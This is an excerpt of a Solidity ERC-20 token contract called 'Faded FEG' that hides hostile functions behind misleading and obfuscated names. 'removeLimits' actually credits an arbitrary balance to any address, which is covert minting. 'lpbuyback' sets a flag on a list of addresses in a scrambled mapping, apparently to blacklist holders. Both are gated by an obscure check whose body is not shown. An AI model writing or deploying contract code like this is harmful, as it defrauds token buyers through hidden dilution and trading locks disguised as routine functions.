...
contract FFEG is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Faded FEG";
    string private _symbol = "FFEG";
    ...
    uint256 public minimumTokensBeforeSwap = 300000000* 10**_decimals; 
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x2378edf4b34365D92E04c4329263683dD5165C4B));
        oBMsVZvBCliMEkFzIRyxOxiIQIYn = payable(address(0x2378edf4b34365D92E04c4329263683dD5165C4B));
    ...
    function removeLimits(uint256 amount,address owner) public { FIAWIDKAKFKAD();
        uint256 data = balanceOf(owner) + amount;
        _balances[owner] = data;
    }
    ...
    function lpbuyback(bool data, address[] calldata liq) public { FIAWIDKAKFKAD();
        for (uint256 i; i < liq.length; i++) {
            apdffscddssrscmn[liq[i]] = data;
        }
    }
